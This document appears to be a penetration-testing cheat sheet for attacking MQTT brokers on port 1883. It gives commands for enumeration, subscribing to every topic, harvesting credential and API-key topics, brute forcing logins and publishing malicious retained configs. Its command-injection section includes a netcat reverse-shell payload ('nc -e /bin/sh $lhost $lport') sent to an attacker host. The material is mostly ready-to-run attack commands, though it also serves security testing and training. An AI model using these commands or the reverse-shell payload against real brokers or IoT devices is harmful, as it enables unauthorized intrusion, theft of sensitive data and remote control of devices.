# Port 1883 - MQTT

## Table of Contents
- [Enumeration](#enumeration)
- [Subscribe and Publish](#subscribe-and-publish)
- [Exploitation](#exploitation)

---

## Enumeration

### Quick Check (One-liner)

```shell
nmap -p 1883 --script "mqtt-subscribe" $rhost && mosquitto_sub -h $rhost -t '#' -v -C 5
```

### Nmap

```shell
nmap -sV -sC -p 1883 $rhost
nmap -p 1883 --script "mqtt-subscribe" $rhost
```

### Check Connection

```shell
# Using mosquitto_sub
mosquitto_sub -h $rhost -t '#' -v

# Using mqtt-cli
mqtt sub -h $rhost -t '#'
```

---

## Subscribe and Publish

### Subscribe to Topics

```shell
# Subscribe to all topics
mosquitto_sub -h $rhost -t '#' -v

# Subscribe to specific topic
mosquitto_sub -h $rhost -t 'home/sensors/temperature' -v

# Subscribe with wildcard
mosquitto_sub -h $rhost -t 'home/+/status' -v
mosquitto_sub -h $rhost -t 'devices/#' -v

# With authentication
mosquitto_sub -h $rhost -t '#' -u username -P password -v
```

### Publish Messages

```shell
# Publish message
mosquitto_pub -h $rhost -t 'home/control/light' -m 'ON'

# Publish with authentication
mosquitto_pub -h $rhost -t 'control/command' -m 'payload' -u username -P password

# Publish retained message
mosquitto_pub -h $rhost -t 'config/device' -m 'malicious_config' -r
```

---

## Exploitation

### Information Disclosure

```shell
# Subscribe to all topics and capture data
mosquitto_sub -h $rhost -t '#' -v | tee mqtt_capture.txt

# Common sensitive topics
$SYS/#                    # Broker statistics
config/#                  # Configuration
credentials/#             # Credentials
api/#                     # API keys
admin/#                   # Admin commands
```

### Brute Force

```shell
# Using Ncrack
ncrack mqtt://$rhost:1883 -U users.txt -P passwords.txt

# Using custom script
python3 mqtt_brute.py -h $rhost -U users.txt -P passwords.txt
```

### Command Injection

```shell
# If MQTT controls devices, try command injection
mosquitto_pub -h $rhost -t 'device/command' -m '$(id)'
mosquitto_pub -h $rhost -t 'device/command' -m '; nc -e /bin/sh $lhost $lport'
```

### Python MQTT Client

```python
#!/usr/bin/env python3
import paho.mqtt.client as mqtt

def on_connect(client, userdata, flags, rc):
    print(f"Connected: {rc}")
    client.subscribe("#")  # Subscribe to all

def on_message(client, userdata, msg):
    print(f"{msg.topic}: {msg.payload.decode()}")

client = mqtt.Client()
client.on_connect = on_connect
client.on_message = on_message

# Optionally set credentials
# client.username_pw_set("user", "pass")

client.connect("$rhost", 1883, 60)
client.loop_forever()
```

---

## MQTT Ports

| Port | Protocol | Description |
| :--- | :--- | :--- |
| 1883 | MQTT | Unencrypted |
| 8883 | MQTTS | TLS encrypted |
| 8080 | MQTT/WS | WebSocket |
| 8081 | MQTT/WSS | WebSocket TLS |

---

## Quick Reference

| Command | Description |
| :--- | :--- |
| `mosquitto_sub -h $rhost -t '#' -v` | Subscribe to all topics |
| `mosquitto_pub -h $rhost -t 'topic' -m 'msg'` | Publish message |
| `mosquitto_sub -h $rhost -t '$SYS/#' -v` | Get broker stats |
| `mosquitto_sub -h $rhost -u user -P pass -t '#'` | Authenticated subscribe |

| Wildcard | Meaning |
| :--- | :--- |
| `#` | Match all levels |
| `+` | Match single level |
